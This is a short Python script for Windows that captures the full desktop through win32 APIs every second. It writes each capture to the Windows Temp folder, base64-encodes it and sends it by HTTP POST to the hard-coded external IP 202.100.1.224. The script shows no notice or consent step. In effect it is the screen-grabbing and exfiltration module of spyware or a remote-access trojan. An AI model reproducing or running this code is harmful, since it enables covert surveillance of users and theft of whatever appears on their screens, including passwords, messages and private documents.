import win32gui
import win32ui
import win32con
import win32api
from flask_client_json import http_post_json
import base64

def img_b64(img):
    b4code = base64.b64encode(img)

    str_b4code = str(b4code)

    str_b4code = str(str_b4code)[2:-1]

    return str_b4code

def screenshotter():
    hdesktop = win32gui.GetDesktopWindow()

    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    screenshot_image = open('c:\\WINDOWS\\Temp\\screenshot.bmp', 'rb').read()
    dict_key = {}
    dict_key['MessageType'] = 'ImageEvent'
    dict_key['Imageb64'] = img_b64(screenshot_image)
    
    http_post_json('202.100.1.224',dict_key)

if __name__ == '__main__':
    import time
    while True:
        time.sleep(1)
        screenshotter()